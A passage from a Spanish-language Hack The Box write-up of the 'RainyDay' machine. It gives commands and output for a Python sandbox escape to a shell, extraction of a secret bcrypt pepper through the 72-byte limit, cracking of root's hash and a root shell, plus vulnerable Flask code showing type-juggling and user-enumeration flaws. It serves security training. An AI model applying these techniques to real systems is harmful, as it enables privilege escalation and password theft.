&lt;class 'async_generator_athrow'&gt;, &lt;class 'async_generator_wrapped_value'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'weakref.CallableProxyType'&gt;, &lt;class 'weakref.ProxyType'&gt;, &lt;class 'weakref.ReferenceType'&gt;, &lt;class 'types.UnionType'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'hamt'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'items'&gt;, &lt;class '_contextvars.Context'&gt;, &lt;class '_contextvars.ContextVar'&gt;, &lt;class '_contextvars.Token'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'importlib._abc.Loader'&gt;, &lt;class 'itertools.accumulate'&gt;, &lt;class 'itertools.combinations'&gt;, &lt;class 'itertools.combinations_with_replacement'&gt;, &lt;class 'itertools.cycle'&gt;, &lt;class 'itertools.dropwhile'&gt;, &lt;class 'itertools.takewhile'&gt;, &lt;class 'itertools.islice'&gt;, &lt;class 'itertools.starmap'&gt;, &lt;class 'itertools.chain'&gt;, &lt;class 'itertools.compress'&gt;, &lt;class 'itertools.filterfalse'&gt;, &lt;class 'itertools.count'&gt;, &lt;class 'itertools.zip_longest'&gt;, &lt;class 'itertools.pairwise'&gt;, &lt;class 'itertools.permutations'&gt;, &lt;class 'itertools.product'&gt;, &lt;class 'itertools.repeat'&gt;, &lt;class 'itertools.groupby'&gt;, &lt;class 'itertools._grouper'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'itertools._tee_dataobject'&gt;, &lt;class 'operator.attrgetter'&gt;, &lt;class 'operator.itemgetter'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'collections.deque'&gt;, &lt;class '_collections._deque_iterator'&gt;, &lt;class '_collections._deque_reverse_iterator'&gt;, &lt;class '_collections._tuplegetter'&gt;, &lt;class 'collections._Link'&gt;, &lt;class 'functools.partial'&gt;, &lt;class 'functools._lru_cache_wrapper'&gt;, &lt;class 'functools.KeyWrapper'&gt;, &lt;class 'functools._lru_list_elem'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib.ContextDecorator'&gt;, &lt;class 'contextlib.AsyncContextDecorator'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;]  
+</code></pre></div><p>Encontramos <code>&lt;class 'os._wrap_close'></code> en el índice 137 de la lista:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo 'print(().__class__.__base__.__subclasses__()[137])' &gt; /tmp/a.py  
+<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
+&lt;class 'os._wrap_close'&gt;
+</code></pre></div><p>Y ahora tenemos acceso a <code>(...).__init__.__globals__['system']</code> y conseguir ejecución de comandos como <code>jack_adm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo '().__class__.__base__.__subclasses__()[137].__init__.__globals__["system"]("bash")' &gt; /tmp/a.py  
+<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
+<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">/home/jack</span>$ cd
+<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -la
+total 20
+drwxr-x--- 2 jack_adm jack_adm 4096 Sep 29 13:47 <span class="code-blue">.</span>
+drwxr-xr-x 4 root     root     4096 Sep 29 13:47 <span class="code-blue">..</span>
+lrwxrwxrwx 1 root     root        9 Sep 29 12:16 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>
+-rw-r--r-- 1 jack_adm jack_adm  220 Jun  4 21:31 .bash_logout
+-rw-r--r-- 1 jack_adm jack_adm 3771 Jun  4 21:31 .bashrc
+-rw-r--r-- 1 jack_adm jack_adm  807 Jun  4 21:31 .profile
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Una enumeración básica nos dice por dónde continuar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ sudo -l
+Matching Defaults entries for jack_adm on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
+
+User jack_adm may run the following commands on localhost:
+    (root) NOPASSWD: /opt/hash_system/hash_password.py
+</code></pre></div><p>De nuevo, no podemos ejecutar el archivo, pero tampoco ver su tamaño:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ cat /opt/hash_system/hash_password.py
+cat: /opt/hash_system/hash_password.py: Permission denied
+<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -lh /opt/hash_system/hash_password.py
+ls: cannot access '/opt/hash_system/hash_password.py': Permission denied  
+<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -lh /opt/
+total 8.0K
+drwx--x--x 4 root root 4.0K Sep 29 13:47 <span class="code-blue">containerd</span>
+drwxr-x--- 3 root root 4.0K Sep 29 13:47 <span class="code-blue">hash_system</span>
+<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -lh /opt/hash_system/
+ls: cannot open directory '/opt/hash_system/': Permission denied
+</code></pre></div><p>El programa nos permite generar <em>hashes</em> de contraseñas usando <code>bcrypt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ sudo /opt/hash_system/hash_password.py
+Enter Password&gt; asdf
+[+] Hash: $2b$05$HESfZkcGQkfPhFrl/0fI8OAByhlqQ0BaZeFj1v9jJUuE.YB4l1Xiy  
+</code></pre></div><p>Podemos darnos cuenta de que el programa añade pimienta a nuestra contraseña, ya que el <em>hash</em> no coincide con <code>asdf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; import bcrypt
+&gt;&gt;&gt; bcrypt.checkpw(b'asdf', b'$2b$05$HESfZkcGQkfPhFrl/0fI8OAByhlqQ0BaZeFj1v9jJUuE.YB4l1Xiy')  
+False
+</code></pre></div><p>Y si generamos nuestro propio <em>hash</em> <code>bcrypt</code>, sí es correcto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; bcrypt.hashpw(b'asdf', bcrypt.gensalt())
+b'$2b$12$zlcV6l5oli1bMn67.YoHAOdOv6ltgXy2Yk3QpzKd44I.XQwcbdCt.'
+&gt;&gt;&gt; bcrypt.checkpw(b'asdf', b'$2b$12$zlcV6l5oli1bMn67.YoHAOdOv6ltgXy2Yk3QpzKd44I.XQwcbdCt.')  
+True
+</code></pre></div><p>Por consiguiente, el programa está usando <code>asdf</code> junto con otra cadena de texto conocida como pimienta, que se mantiene en secreto.</p><h3 id="encontrando-la-pimienta-secreta">Encontrando la pimienta secreta</h3><p>Existe un límite para las contraseñas de entrada a <code>bcrypt</code>, que es 72 bytes (más información <a href="https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length">aquí</a>).</p><p>Pero no podemos introducir más de 30 caracteres:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ sudo /opt/hash_system/hash_password.py
+Enter Password&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaAAAAAAAAAAAA  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa
+[+] Invalid Input Length! Must be &lt;= 30
+</code></pre></div><p>Aunque podemos usar un truco, que es poner <em>emoji</em>, que son menos caracteres que bytes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; len('⚡️')
+2
+&gt;&gt;&gt; len('⚡️'.encode())  
+6
+</code></pre></div><p>Entonces, la idea es usar <em>emoji</em> y otros caracteres de relleno hasta alcanzar los 71 bytes, de manera que el byte número 72 es parte de la pimienta. Así, con el <em>hash</em> resultante, podemos usar fuerza bruta para obtener el primer byte de la pimienta. Después de esto, podemos iterar reduciendo el relleno y obtener los siguientes caracteres de la pimienta.</p><p>Para este propósito, utilicé otro <em>script</em> en Python que se conecta a la máquina como <code>jack</code> mediante SSH en <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>, se cambia al usuario <code>jack_adm</code> y realiza el ataque descrito anteriormente para extraer la pimienta secreta. El <em>script</em> se llama <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay/extract_pepper.py">extract_pepper.py</a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay#extract_pepperpy">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_pepper.py</span>
+[<span class="code-green">+</span>] Connecting to rainycloud.htb on port 22: Done
+[<span class="code-blue">*</span>] jack@rainycloud.htb:
+    Distro    Ubuntu 22.04
+    OS:       linux
+    Arch:     amd64
+    Version:  5.15.0
+    ASLR:     <span class="code-dark-green">Enabled</span>
+[<span class="code-green">+</span>] Starting remote process bytearray(b'bash') on rainycloud.htb: pid 73184  
+[<span class="code-green">+</span>] Got shell as `jack_adm`
+[<span class="code-green">+</span>] Payload: ⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️A
+[<span class="code-green">+</span>] Pepper: H34vyR41n
+</code></pre></div><h3 id="rompiendo-el-_hash_-de-root">Rompiendo el <em>hash</em> de <code>root</code></h3><p>Finalmente, tenemos que coger el <em>hash</em> de <code>root</code> (de antes) y hacer otro ataque de fuerza bruta con la pimienta anterior. Otra vez, escribí un <em>script</em> personalizado para romper el <em>hash</em>: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay/extract_pepper.py">crack.py</a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay#crackpy">here</a>).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">crack.py</span> $WORDLISTS/rockyou.txt <span class="code-dark-yellow">'$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W'</span> H34vyR41n  
+[+] Password: b'246813579'
+</code></pre></div><p>Y ahora podemos usar <code>246813579H34vyR41n</code> como contraseña para conseguir una <em>shell</em> como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ su root
+Password:
+root@rainyday:/home/jack_adm# cat /root/root.txt  
+94d0f6ae36dcfa3d6d634b82716d3aeb
+</code></pre></div><h2 id="aclaraciones">Aclaraciones</h2><p>A continuación, se pueden encontrar algunas explicaciones de por qué las técnicas anteriores han funcionado, analizando el código fuente.</p><h3 id="_type-juggling_-en-la-api"><em>Type Juggling</em> en la API</h3><p>Pudimos confundir a la API con valores en coma flotante por este bloque de código:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">"/api/user/&lt;uid&gt;"</span><span class="mtk1">)</span>
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">api_user</span><span class="mtk1">(</span><span class="mtk9 mtki">uid</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {}</span>
+<span class="mtk1">    </span><span class="mtk3"># we've had some crashes here before so do a simpl</span><span class="mtk3">e try/except</span>
+<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">u</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">User</span><span class="mtk1">.query.filter_by(</span><span class="mtk9 mtki">id</span><span class="mtk5">=</span><span class="mtk9 mtki">uid</span><span class="mtk1">).first()</span>
+<span class="mtk1">        </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk1">c</span><span class="mtk1">.name: </span><span class="mtk8">getattr</span><span class="mtk1">(</span><span class="mtk1">u</span><span class="mtk1">, </span><span class="mtk1">c</span><span class="mtk1">.name) </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">u</span><span class="mtk1">.__table__.columns}</span>  
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk9 mtki">uid</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"id"</span><span class="mtk1">, </span><span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">None</span><span class="mtk1">):</span>
+<span class="mtk1">            </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk4">"Error"</span><span class="mtk1">: </span><span class="mtk4">"Not allowed to view other users info!"</span><span class="mtk1">}</span>
+<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk5">pass</span>
+
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">response</span>
+</code></pre></div><p>Al usar números <em>float</em>, ocasionamos una excepción, por lo que los resultados son devueltos. La variable <code>id</code> se trata coo un valor en la base de datos, no importa el tipo, pero sí importa para el intérprete de Python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; int('1.0')
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+ValueError: invalid literal for int() with base 10: '1.0'  
+</code></pre></div><h3 id="enumeración-de-usuarios-1">Enumeración de usuarios</h3><p>El proceso de enumeración de usuarios fue posible porque el servidor primero comprueba que el usuario existe y luego verifica la contraseña, y lanza dos mensajes de error diferentes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">"/login"</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">"GET"</span><span class="mtk1">, </span><span class="mtk4">"POST"</span><span class="mtk1">])</span>
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">login</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"GET"</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"username"</span><span class="mtk1">, </span><span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">None</span><span class="mtk1">, </span><span class="mtk9 mtki">type</span><span class="mtk5">=</span><span class="mtk8 mtku">str</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"password"</span><span class="mtk1">, </span><span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">None</span><span class="mtk1">, </span><span class="mtk9 mtki">type</span><span class="mtk5">=</span><span class="mtk8 mtku">str</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">is</span><span class="mtk1"> </span><span class="mtk6">None</span><span class="mtk1"> </span><span class="mtk5">or</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">is</span><span class="mtk1"> </span><span class="mtk6">None</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk4">"Missing Parameter!"</span><span class="mtk1">, </span><span class="mtk9 mtki">error_specific</span><span class="mtk5">=</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">:</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">lineno</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>
+<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk1">u</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">User</span><span class="mtk1">.query.filter_by(</span><span class="mtk9 mtki">username</span><span class="mtk5">=</span><span class="mtk1">username</span><span class="mtk1">).first()</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">u</span><span class="mtk1"> </span><span class="mtk5">is</span><span class="mtk1"> </span><span class="mtk6">None</span><span class="mtk1">:</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk4">"Login Incorrect!"</span><span class="mtk1">, </span><span class="mtk9 mtki">error_specific</span><span class="mtk5">=</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">:</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">lineno</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>
+<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">bcrypt</span><span class="mtk1">.</span><span class="mtk8">checkpw</span><span class="mtk1">(</span><span class="mtk1">password</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">(), </span><span class="mtk1">u</span><span class="mtk1">.password.encode()):</span>
+<span class="mtk1">                    </span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span>
+<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk8">url_for</span><span class="mtk1">(</span><span class="mtk4">"index"</span><span class="mtk1">))</span>
+<span class="mtk1">                </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk4">"Login Incorrect!"</span><span class="mtk1">, </span><span class="mtk9 mtki">error_specific</span><span class="mtk5">=</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">:</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">lineno</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>  
+</code></pre></div><h3 id="inspección-de-procesos-desde-los-contenedores">Inspección de procesos desde los contenedores</h3><p>Supongo que la vía intencionada era acceder al contenedor de <code>jack</code>, leer la pista y luego leer el sistema de archivos de la máquina desde el contenedor usando <code>/proc</code>. Realmente, esto es posible desde el contenedor de <code>gary</code> en segundo plano, porque le UID es 1000, el mismo que el proceso que nos da acceso al sistema de archivos. A lo mejor el desarrollador se olvido de añadirlo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">                </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">.</span><span class="mtk8">startswith</span><span class="mtk1">(</span><span class="mtk4">"execdetach"</span><span class="mtk1">):</span>
+<span class="mtk1">                    </span><span class="mtk1">action_cmd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">[</span><span class="mtk6">10</span><span class="mtk1">:]</span>
+<span class="mtk1">                    </span><span class="mtk1">exit_code</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">container</span><span class="mtk1">.exec_run(</span><span class="mtk1">action_cmd</span><span class="mtk1">, </span><span class="mtk9 mtki">detach</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">privileged</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">"1000:1000"</span><span class="mtk1">)</span>
+<span class="mtk1">                </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">.</span><span class="mtk8">startswith</span><span class="mtk1">(</span><span class="mtk4">"exec"</span><span class="mtk1">):</span>
+<span class="mtk1">                    </span><span class="mtk1">action_cmd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">[</span><span class="mtk6">4</span><span class="mtk1">:]</span>
+<span class="mtk1">                    </span><span class="mtk1">exit_code</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">container</span><span class="mtk1">.exec_run(</span><span class="mtk4">"timeout 5s "</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">action_cmd</span><span class="mtk1">, </span><span class="mtk9 mtki">privileged</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">"1000:1000"</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"jack"</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk4">"1337:1337"</span><span class="mtk1">)</span>  
